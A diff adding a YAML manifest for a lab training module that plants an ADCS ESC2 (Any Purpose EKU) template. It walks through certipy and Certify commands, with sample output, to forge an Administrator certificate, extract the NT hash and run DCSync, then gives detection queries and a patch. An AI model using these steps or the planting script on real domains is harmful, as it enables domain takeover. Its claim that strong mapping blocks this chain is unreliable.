@@ -1,0 +1,581 @@
+# Bolt-on: ADCS ESC2 — Any Purpose EKU
+# -------------------------------------
+# Publishes a certificate template with the Any Purpose EKU
+# (OID 2.5.29.37.0) and Domain Users enrollment rights. Because Any Purpose
+# subsumes Client Authentication, the issued cert can be used for PKINIT
+# regardless of explicit Client Auth EKU presence. ENROLLEE_SUPPLIES_SUBJECT
+# is NOT required for ESC2 — the cert is usable as-is by the requesting
+# principal but escalates if the principal can request on behalf of others
+# or if the cert is later relayed.
+#
+# Patch replaces the Any Purpose EKU with a tightly scoped EKU list and adds
+# Manager Approval (PEND_ALL_REQUESTS).
+#
+# Elastic detection coverage is thin — no published rule fires directly on
+# pKIExtendedKeyUsage misconfiguration. Coverage_status = no-rule.
+
+id: bolton.adcs.esc2-any-purpose-eku
+slug: esc2-any-purpose-eku
+name: "ADCS ESC2 — Any Purpose EKU"
+version: "1.0.0"
+author: "Red Team Infra"
+last_updated: 2026-05-19
+
+category: adcs
+subcategory: esc2
+tags:
+  - adcs
+  - certificate-template
+  - any-purpose-eku
+  - privilege-escalation
+description: >
+  Publishes a certificate template "ESC2-AnyPurpose" on the lab CA whose
+  pKIExtendedKeyUsage contains the Any Purpose OID (2.5.29.37.0) and grants
+  Domain Users Enroll + Autoenroll permissions. Any Purpose subsumes every
+  named EKU including Client Authentication and Server Authentication, so
+  the resulting certificate can PKINIT-authenticate. Combined with NTLM
+  relay or coercion primitives, this becomes a domain takeover path. This
+  is the canonical Certified Pre-Owned ESC2 misconfiguration.
+
+cve: []
+references:
+  - "https://attack.mitre.org/techniques/T1649/"
+  - "https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf"
+  - "https://learn.microsoft.com/en-us/windows-server/identity/ad-cs/manage-certificate-templates"
+
+mitre:
+  tactic:
+    id: TA0006
+    name: "Credential Access"
+  technique:
+    id: T1649
+    name: "Steal or Forge Authentication Certificates"
+  notes: "ESC2 — Any Purpose EKU is a superset of Client Authentication."
+
+detection:
+  coverage_status: no-rule
+  elastic_rules: []
+  fallback_rule_template: "webapp/bolton/rule_templates/adcs-esc2-anypurpose-eku.j2.yml"
+  signal_sources:
+    - "Windows Event 4886 (Certificate Services received a certificate request)"
+    - "Windows Event 4887 (Certificate Services approved a certificate request)"
+    - "Windows Event 5136 (Directory Service object modified — pKIExtendedKeyUsage)"
+
+targets:
+  supported_os:
+    - family: windows
+      min_version: "2016"
+      max_version: "2025"
+      edition_in: ["Datacenter", "Standard"]
+  required_roles:
+    - ca_host
+  required_services:
+    - adcs
+  required_domain_function_level: "2016"
+
+depends_on: []
+conflicts_with: []
+
+side_effects:
+  global: true        # template published to forest config NC
+  network_visible: false
+  reboot_required: false
+
+install:
+  estimated_time_seconds: 90
+  steps:
+    - ansible_role: community.windows.win_powershell
+      description: "Duplicate the User template and set Any Purpose EKU."
+      role_vars:
+        script: |
+          $sourceTpl = "User"
+          $newTpl    = "ESC2-AnyPurpose"
+          $configNc  = (Get-ADRootDSE).configurationNamingContext
+          $tplPath   = "CN=Certificate Templates,CN=Public Key Services,CN=Services,$configNc"
+
+          $source = Get-ADObject -Identity "CN=$sourceTpl,$tplPath" -Properties *
+          $attrs = @{
+            'displayName'                          = $newTpl
+            'flags'                                = $source.flags
+            'pKIExtendedKeyUsage'                  = @('2.5.29.37.0')   # Any Purpose
+            'msPKI-Certificate-Application-Policy' = @('2.5.29.37.0')
+            'msPKI-Certificate-Name-Flag'          = 0
+            'msPKI-Enrollment-Flag'                = 0
+            'msPKI-RA-Signature'                   = 0
+            'pKIDefaultKeySpec'                    = 1
+            'pKIExpirationPeriod'                  = $source.pKIExpirationPeriod
+            'pKIKeyUsage'                          = $source.pKIKeyUsage
+          }
+          New-ADObject -Name $newTpl -Type pKICertificateTemplate `
+                       -Path $tplPath -OtherAttributes $attrs
+
+          $acl = Get-Acl "AD:CN=$newTpl,$tplPath"
+          $sid = (Get-ADGroup "Domain Users").SID
+          $ace = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
+            $sid, 'ExtendedRight', 'Allow', [Guid]'0e10c968-78fb-11d2-90d4-00c04f79dc55')
+          $acl.AddAccessRule($ace)
+          Set-Acl "AD:CN=$newTpl,$tplPath" -AclObject $acl
+
+          $ca = (Get-CertificationAuthority).Name
+          Add-CATemplate -Name $newTpl -Force -Confirm:$false -CertificationAuthority $ca
+  verify:
+    probe: |
+      $configNc = (Get-ADRootDSE).configurationNamingContext
+      $tpl = Get-ADObject -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,$configNc" `
+        -Filter "name -eq 'ESC2-AnyPurpose'" -Properties pKIExtendedKeyUsage
+      if ($tpl -and $tpl.pKIExtendedKeyUsage -contains '2.5.29.37.0') { exit 0 } else { exit 1 }
+    timeout_seconds: 60
+    expect_exit_code: 0
+
+uninstall:
+  description: "Unpublish from CA and delete the template AD object."
+  estimated_time_seconds: 30
+  steps:
+    - ansible_role: community.windows.win_powershell
+      description: "Remove from CA + delete the template object."
+      role_vars:
+        script: |
+          $ca = (Get-CertificationAuthority).Name
+          Remove-CATemplate -Name "ESC2-AnyPurpose" -Force -Confirm:$false -CertificationAuthority $ca
+          $configNc = (Get-ADRootDSE).configurationNamingContext
+          $dn = "CN=ESC2-AnyPurpose,CN=Certificate Templates,CN=Public Key Services,CN=Services,$configNc"
+          Remove-ADObject -Identity $dn -Confirm:$false
+  verify:
+    probe: |
+      $configNc = (Get-ADRootDSE).configurationNamingContext
+      Get-ADObject -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,$configNc" `
+        -Filter "name -eq 'ESC2-AnyPurpose'" | Measure-Object | Select-Object -ExpandProperty Count
+    timeout_seconds: 30
+    expect_stdout_contains: "0"
+
+patch:
+  description: >
+    Remove Any Purpose (2.5.29.37.0) from pKIExtendedKeyUsage and
+    msPKI-Certificate-Application-Policy, replace with a tight EKU list
+    (Encrypting File System 1.3.6.1.4.1.311.10.3.4 only — the original
+    purpose of the User template), and add Manager Approval
+    (msPKI-Enrollment-Flag bit 0x2 — PEND_ALL_REQUESTS).
+  patch_reference:
+    - "https://learn.microsoft.com/en-us/windows-server/identity/ad-cs/manage-certificate-templates"
+    - "https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf"
+  complexity: low
+  side_effects:
+    - "Any Purpose EKU (2.5.29.37.0) removed from pKIExtendedKeyUsage"
+    - "EKU restricted to Encrypting File System (1.3.6.1.4.1.311.10.3.4)"
+    - "msPKI-Enrollment-Flag bit 0x2 (Manager Approval) set"
+    - "Existing certificates already issued remain valid until expiry"
+  rollback_supported: true
+  steps:
+    - ansible_role: community.windows.win_powershell
+      description: "Strip Any Purpose EKU and add Manager Approval gate."
+      role_vars:
+        script: |
+          $configNc = (Get-ADRootDSE).configurationNamingContext
+          $dn = "CN=ESC2-AnyPurpose,CN=Certificate Templates,CN=Public Key Services,CN=Services,$configNc"
+          $tpl = Get-ADObject -Identity $dn -Properties msPKI-Enrollment-Flag
+          $newEnr = $tpl.'msPKI-Enrollment-Flag' -bor 0x2
+          Set-ADObject -Identity $dn -Replace @{
+            'pKIExtendedKeyUsage'                  = @('1.3.6.1.4.1.311.10.3.4')
+            'msPKI-Certificate-Application-Policy' = @('1.3.6.1.4.1.311.10.3.4')
+            'msPKI-Enrollment-Flag'                = $newEnr
+          }
+  verify:
+    probe: |
+      $configNc = (Get-ADRootDSE).configurationNamingContext
+      $dn = "CN=ESC2-AnyPurpose,CN=Certificate Templates,CN=Public Key Services,CN=Services,$configNc"
+      $tpl = Get-ADObject -Identity $dn -Properties pKIExtendedKeyUsage, msPKI-Enrollment-Flag
+      $any_gone = -not ($tpl.pKIExtendedKeyUsage -contains '2.5.29.37.0')
+      $mgr_set  = ($tpl.'msPKI-Enrollment-Flag' -band 0x2) -ne 0
+      if ($any_gone -and $mgr_set) { exit 0 } else { exit 1 }
+    timeout_seconds: 30
+    expect_exit_code: 0
+  exploit_probe_after_patch: "webapp/bolton/exploit_probes/adcs_esc2_certipy_check.sh"
+
+patch_revert:
+  description: "Restore Any Purpose EKU and clear Manager Approval — template is ESC2-vulnerable again."
+  estimated_time_seconds: 20
+  steps:
+    - ansible_role: community.windows.win_powershell
+      description: "Re-add Any Purpose and remove approval gate."
+      role_vars:
+        script: |
+          $configNc = (Get-ADRootDSE).configurationNamingContext
+          $dn = "CN=ESC2-AnyPurpose,CN=Certificate Templates,CN=Public Key Services,CN=Services,$configNc"
+          Set-ADObject -Identity $dn -Replace @{
+            'pKIExtendedKeyUsage'                  = @('2.5.29.37.0')
+            'msPKI-Certificate-Application-Policy' = @('2.5.29.37.0')
+            'msPKI-Enrollment-Flag'                = 0
+          }
+  verify:
+    probe: |
+      $configNc = (Get-ADRootDSE).configurationNamingContext
+      $dn = "CN=ESC2-AnyPurpose,CN=Certificate Templates,CN=Public Key Services,CN=Services,$configNc"
+      $tpl = Get-ADObject -Identity $dn -Properties pKIExtendedKeyUsage
+      if ($tpl.pKIExtendedKeyUsage -contains '2.5.29.37.0') { exit 0 } else { exit 1 }
+    timeout_seconds: 30
+    expect_exit_code: 0
+  warning: "Template is ESC2-vulnerable again. Certipy can request certs usable for PKINIT."
+
+cost:
+  storage_mb: 0
+  cpu_pct: 0
+  detectability: quiet
+
+curriculum:
+  title: "ADCS ESC2 — Any Purpose EKU template to domain takeover"
+  summary: >
+    Walkthrough of Certified Pre-Owned ESC2 against the test lab CA
+    on `tldc01` (10.99.50.10). Unlike ESC1, this template does NOT
+    let you supply your own subject — instead it grants the Any Purpose
+    EKU (`2.5.29.37.0`), which subsumes every named EKU including
+    Client Authentication, Enrollment Agent, and Server Authentication.
+    The exploitation path uses ESC2 to issue an Enrollment Agent cert
+    and then request a Client Auth cert ON BEHALF OF Administrator.
+  learning_objectives:
+    - "Explain why the Any Purpose EKU (OID 2.5.29.37.0) is a superset that enables every certificate use case."
+    - "Distinguish ESC2 (Any Purpose EKU) from ESC1 (Enrollee Supplies Subject) — the exploitation path differs."
+    - "Chain ESC2 → Enrollment Agent → CertReqOnBehalf to forge an Administrator cert."
+    - "Identify Subject Alternative Name (SAN) extension validation as the patch story."
+  prerequisites:
+    - "Low-privilege TESTLAB credentials (`TESTLAB\\j.doe:Welcome1!`)"
+    - "certipy-ad >= 5.0 on Kali — `pipx install certipy-ad`"
+    - "Network reach from Kali (192.168.1.100, via bastion) to tldc01 (10.99.50.10) on 88/135/445/80"
+    - "Cobalt Strike beacon on tlws01 (10.99.50.12) as TESTLAB\\j.doe for the Certify.exe alternative"
+    - "Certify.exe binary from GhostPack — https://github.com/GhostPack/Certify"
+    - "Impacket >= 0.11 on Kali for secretsdump.py"
+  estimated_total_minutes: 40
+  steps:
+    - id: "01-enumerate-esc2"
+      title: "Find Any Purpose EKU templates with Certipy"
+      estimated_minutes: 6
+      markdown: |
+        ## Step 1 — Locate the ESC2-vulnerable template
+
+        Re-use the same enumeration command from ESC1 — Certipy reports
+        both ESC1 and ESC2 in one pass:
+
+        ```bash
+        # From Kali
+        certipy-ad find \
+            -u 'j.doe@testlab.local' -p 'Welcome1!' \
+            -dc-ip 10.99.50.10 \
+            -stdout -vulnerable
+        ```
+
+        Expected output (filtered to the ESC2 template):
+
+        ```
+        Certificate Templates
+          1
+            Template Name                       : ESC2-AnyPurpose
+            Display Name                        : ESC2-AnyPurpose
+            Certificate Authorities             : testlab-TLDC01-CA
+            Enabled                             : True
+            Client Authentication               : True       (implied — Any Purpose subsumes it)
+            Enrollment Agent                    : True       (implied — Any Purpose subsumes it)
+            Any Purpose                         : True       <-- ESC2 flag
+            Enrollee Supplies Subject           : False
+            Extended Key Usage                  : Any Purpose
+            Requires Manager Approval           : False
+            Permissions
+              Enrollment Rights                 : TESTLAB.LOCAL\Domain Users
+            [!] Vulnerabilities
+              ESC2                              : 'TESTLAB.LOCAL\\Domain Users' can enroll and template has Any Purpose EKU (2.5.29.37.0)
+              ESC3                              : 'TESTLAB.LOCAL\\Domain Users' can enroll and template grants Enrollment Agent EKU
+        ```
+
+        Note: Certipy reports BOTH ESC2 and ESC3 because Any Purpose
+        subsumes the Certificate Request Agent EKU
+        (1.3.6.1.4.1.311.20.2.1) too. That dual-classification opens
+        the easiest exploitation path — ESC3 — which is what we will
+        use in step 3.
+
+        **Alternative — Certify.exe from beacon**:
+
+        ```
+        beacon> execute-assembly /opt/Certify/Certify.exe find /vulnerable
+        ```
+
+        > **Elastic rule that fires**: none — enumeration is read-only
+        > LDAP. Coverage starts in step 2.
+      assessment:
+        question: "Why does the Any Purpose EKU (`2.5.29.37.0`) make a template MORE dangerous than a template with both Client Auth and Server Auth EKUs explicitly listed?"
+        options:
+          - "Any Purpose is parsed faster by the CA, so requests succeed more often."
+          - "Any Purpose is a wildcard that explicitly subsumes EVERY named EKU — including ones the template author may not have considered (Enrollment Agent, KDC Auth, Smartcard Logon) — so an attacker has more chained-exploitation paths than they would with an enumerated EKU list."
+          - "Explicit EKU lists are deprecated in Windows Server 2022."
+          - "Any Purpose disables CRL checking."
+        correct_index: 1
+        explanation: >
+          The danger of Any Purpose is that the template author did not
+          enumerate which uses they intended — and an attacker is free
+          to use it for any of them. A template with `Client Auth +
+          Server Auth` only is bad (allows PKINIT) but bounded; a
+          template with `Any Purpose` also allows the Enrollment Agent
+          EKU, which is the ESC3 chain to "request a cert on behalf
+          of anyone in the domain". Any Purpose is a superset.
+    - id: "02-request-enrollment-agent-cert"
+      title: "Issue yourself an Enrollment Agent certificate"
+      estimated_minutes: 7
+      markdown: |
+        ## Step 2 — Issue an Enrollment Agent cert (via the Any Purpose EKU)
+
+        Because the Any Purpose EKU includes the Enrollment Agent EKU
+        (`1.3.6.1.4.1.311.20.2.1`), a cert issued from this template
+        can be used to request other certs ON BEHALF OF any principal.
+        This is the ESC3 chain riding on the ESC2 template.
+
+        First issue yourself a normal cert from the template:
+
+        ```bash
+        # From Kali
+        certipy-ad req \
+            -u 'j.doe@testlab.local' -p 'Welcome1!' \
+            -dc-ip 10.99.50.10 \
+            -target tldc01.testlab.local \
+            -ca 'testlab-TLDC01-CA' \
+            -template 'ESC2-AnyPurpose' \
+            -out /tmp/jdoe-anypurpose
+        ```
+
+        Expected:
+
+        ```
+        [*] Requesting certificate via RPC
+        [*] Successfully requested certificate
+        [*] Request ID is 14
+        [*] Got certificate with UPN 'j.doe@testlab.local'
+        [*] Saved certificate and private key to '/tmp/jdoe-anypurpose.pfx'
+        ```
+
+        The cert's subject is `j.doe` (no impersonation here), but the
+        EKU includes Any Purpose / Certificate Request Agent.
+
+        **Alternative — Certify.exe from beacon**:
+
+        ```
+        beacon> execute-assembly /opt/Certify/Certify.exe request /ca:tldc01.testlab.local\testlab-TLDC01-CA /template:ESC2-AnyPurpose
+        ```
+
+        > **Elastic rule that fires**: Windows Event 4886/4887 on the
+        > CA — generic CA request audit, no template-misuse signal.
+    - id: "03-request-on-behalf-of-admin"
+      title: "Use the Enrollment Agent cert to request an Administrator cert"
+      estimated_minutes: 8
+      markdown: |
+        ## Step 3 — The ESC3 chain — request on behalf of Administrator
+
+        Now use the Enrollment Agent cert to request a Client
+        Authentication cert FOR `administrator@testlab.local`. The CA
+        accepts the request because the requesting cert has the
+        Enrollment Agent EKU.
+
+        ```bash
+        # From Kali — request a User cert on behalf of administrator
+        certipy-ad req \
+            -u 'j.doe@testlab.local' -p 'Welcome1!' \
+            -dc-ip 10.99.50.10 \
+            -target tldc01.testlab.local \
+            -ca 'testlab-TLDC01-CA' \
+            -template 'User' \
+            -on-behalf-of 'TESTLAB\administrator' \
+            -pfx /tmp/jdoe-anypurpose.pfx \
+            -out /tmp/admin
+        ```
+
+        Expected:
+
+        ```
+        [*] Requesting certificate via RPC
+        [*] Successfully requested certificate
+        [*] Request ID is 15
+        [*] Got certificate with UPN 'administrator@testlab.local'
+        [*] Certificate object SID is 'S-1-5-21-...-500'
+        [*] Saved certificate and private key to '/tmp/admin.pfx'
+        ```
+
+        Now PKINIT-authenticate as Administrator and extract the NT hash:
+
+        ```bash
+        certipy-ad auth -pfx /tmp/admin.pfx -dc-ip 10.99.50.10
+        ```
+
+        Expected:
+
+        ```
+        [*] Using principal: administrator@testlab.local
+        [*] Trying to get TGT...
+        [*] Got TGT
+        [*] Saved credential cache to 'administrator.ccache'
+        [*] Trying to retrieve NT hash for 'administrator'
+        [*] Got hash for 'administrator@testlab.local': aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c
+        ```
+
+        Same outcome as ESC1 — Administrator's NT hash in hand. DCSync
+        is one secretsdump away:
+
+        ```bash
+        secretsdump.py -hashes :8846f7eaee8fb117ad06bdd830b7586c \
+            -just-dc TESTLAB.LOCAL/administrator@10.99.50.10
+        ```
+
+        > **Elastic rule that fires**: Windows Event 4887 with the
+        > `Subject` field containing `administrator@testlab.local`
+        > while the `Requester` field is `TESTLAB\j.doe` — the
+        > smoking-gun impersonation signal. No Elastic-prebuilt rule
+        > catches this directly; this bolt-on's
+        > `fallback_rule_template` (`adcs-esc2-anypurpose-eku.j2.yml`)
+        > materialises the correlation.
+      assessment:
+        question: "How does the ESC2 exploitation chain differ structurally from ESC1?"
+        options:
+          - "ESC2 requires two cert requests (one Enrollment Agent cert, then one on-behalf-of cert); ESC1 only requires one cert request because the enrollee supplies the subject directly."
+          - "ESC2 requires Domain Admin to install; ESC1 does not."
+          - "ESC2 only works against domain controllers; ESC1 works against member servers."
+          - "ESC1 uses Kerberos PKINIT; ESC2 uses NTLM."
+        correct_index: 0
+        explanation: >
+          ESC1 is a single request — Enrollee Supplies Subject lets
+          you stuff `administrator@...` into the SAN UPN directly,
+          and the CA signs it. ESC2 is two requests — first you get
+          yourself an Enrollment Agent cert (legitimate subject), then
+          you use that cert's CRA EKU to request another cert on behalf
+          of administrator. Both end with the same primitive (an
+          Administrator cert for PKINIT), but the request chain is
+          different — which means the audit trail in 4886/4887 logs
+          looks different too.
+    - id: "04-detection-and-mitigation"
+      title: "Detection coverage and the SAN-validation patch"
+      estimated_minutes: 9
+      markdown: |
+        ## Step 4 — Detection coverage
+
+        This bolt-on ships `coverage_status: no-rule` — no Elastic
+        prebuilt rule catches Any Purpose EKU misconfiguration. Defenders
+        must hand-roll.
+
+        ### Raw EVTX events on the CA host (tldc01)
+
+        | Event | What it tells you |
+        |---|---|
+        | **4886** | CA received a request — record the Requester + Subject + Template |
+        | **4887** | CA approved a request — same fields; cross-reference with 4886 for full trail |
+        | 5136 | DS object modified — fires on `pKIExtendedKeyUsage` changes (install side) |
+        | 4768 PreAuthType=16 | PKINIT TGT issued — find cert-authenticated principals |
+
+        ### Highest-fidelity correlation
+
+        Two-stage Kibana correlation:
+
+        ```
+        # Stage 1: Detect Enrollment Agent cert issuance
+        event.code:4887 AND
+        winlog.event_data.CertificateTemplate:"ESC2-AnyPurpose" AND
+        winlog.event_data.RequesterUser:"TESTLAB\\j.doe"
+
+        # Stage 2 (within 10 minutes): Detect on-behalf-of follow-up
+        event.code:4886 AND
+        winlog.event_data.RequesterUser:"TESTLAB\\j.doe" AND
+        winlog.event_data.AttributeOnBehalfOf:*administrator*
+        ```
+
+        Either stage alone is noisy; the two together within a short
+        window is the smoking gun.
+
+        ### Template-audit query (run quarterly)
+
+        ```powershell
+        # On the CA host
+        Get-ADObject -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,$((Get-ADRootDSE).configurationNamingContext)" `
+          -Filter * -Properties pKIExtendedKeyUsage |
+          Where-Object { $_.pKIExtendedKeyUsage -contains '2.5.29.37.0' } |
+          Select-Object Name, pKIExtendedKeyUsage
+        ```
+
+        Any non-empty result is a finding — Any Purpose EKU should
+        NEVER appear in a production template. Remediate immediately.
+
+        > **Microsoft's strategic mitigation (KB5014754)**: enables
+        > **strong certificate mapping** by default after February 2025.
+        > Certificates without the SID-extension OID
+        > (`1.3.6.1.4.1.311.25.2`) fail PKINIT — which blocks the
+        > SAN-only impersonation path used by both ESC1 and ESC2.
+        > Enforcement of strong mapping closes the entire ESC1/ESC2
+        > family at the protocol level. The lab DC is intentionally
+        > left in compatibility mode for this exercise.
+      assessment:
+        question: "Microsoft KB5014754 enforces strong certificate mapping. Why does this close ESC1/ESC2 at the protocol level even if the template misconfiguration remains?"
+        options:
+          - "It revokes all previously-issued certificates."
+          - "It requires certificates to contain a SID extension (OID 1.3.6.1.4.1.311.25.2) that maps the cert to a SPECIFIC AD principal. PKINIT then validates that the cert's SID matches the requesting account's SID — Subject Alternative Name UPN spoofing is no longer sufficient."
+          - "It disables PKINIT entirely."
+          - "It blocks the Enrollment Agent EKU from being used."
+        correct_index: 1
+        explanation: >
+          KB5014754's strong mapping requires certificates to contain
+          the requesting account's actual SID in an extension. PKINIT
+          then refuses to authenticate certs where the SAN UPN doesn't
+          match the cert's SID extension. The CA itself can still issue
+          a SAN-spoofed cert (the template is still misconfigured), but
+          DCs refuse to honour it for authentication. This is why
+          KB5014754 is the strategic fix and template hardening is the
+          tactical fix — both are needed in defence in depth.
+    - id: "05-apply-patch"
+      title: "Patch the template + AD CS hardening"
+      estimated_minutes: 10
+      markdown: |
+        ## Step 5 — Patch + harden
+
+        Click **Patch** on this card. The bolt-on's patch block:
+
+        1. Removes Any Purpose (`2.5.29.37.0`) from `pKIExtendedKeyUsage`
+           and `msPKI-Certificate-Application-Policy`.
+        2. Replaces with the Encrypting File System EKU
+           (`1.3.6.1.4.1.311.10.3.4`) — the User template's original
+           purpose.
+        3. Sets PEND_ALL_REQUESTS (Manager Approval) on
+           `msPKI-Enrollment-Flag`.
+
+        Re-run step 3's on-behalf-of request — it now fails:
+
+        ```
+        [-] Got error while requesting certificate: code: 0x80094800 - CERTSRV_E_TEMPLATE_DENIED
+        ```
+
+        The template no longer has the Certificate Request Agent EKU
+        (it had it implicitly via Any Purpose), so on-behalf-of
+        requests are rejected at the CA.
+
+        ### Strategic AD CS hardening (Microsoft + SpecterOps)
+
+        | Control | Why |
+        |---|---|
+        | **Apply KB5014754 + enable strong mapping enforcement** (Feb 2025 default) | Closes ESC1/ESC2 family at the PKINIT layer |
+        | **Quarterly Any-Purpose EKU audit** (script in step 4) | Catch new misconfigs |
+        | **Restrict Enrollment Agent rights via `msPKI-Enrollment-Agent`** on the CA | Limits which templates an EA cert can request — even if a template has EA EKU |
+        | **Set Manager Approval on every Client Auth template** | Catches operator review even if EKU is misconfigured |
+        | **Disable HTTP web enrollment** | Removes ESC8 NTLM-relay-to-CA chain |
+        | **Set `EDITF_ATTRIBUTESUBJECTALTNAME2 = 0`** on every CA | Prevents ESC6 — global SAN override |
+
+        Verify hardening:
+
+        ```bash
+        # From Kali
+        ./webapp/bolton/exploit_probes/adcs_esc2_certipy_check.sh \
+            ESC2-AnyPurpose testlab-TLDC01-CA tldc01.testlab.local
+        # Expected exit code: 1 — Certipy on-behalf-of request denied
+        ```
+
+        > **Rollback**: the manifest declares `patch_revert` — clicking
+        > Revert re-adds Any Purpose and clears the approval gate.
+
+        > **Existing certs**: any cert issued from the template BEFORE
+        > the patch remains valid until expiry. To fully remediate,
+        > revoke them via `certutil -revoke <RequestID> 4` and publish
+        > a new CRL.
+
+        > **Elastic rule that fires (mitigation phase)**: Windows
+        > Event 5136 on the `pKIExtendedKeyUsage` write is the install
+        > / patch / revert signal — pair with change control.
+
+status: stable
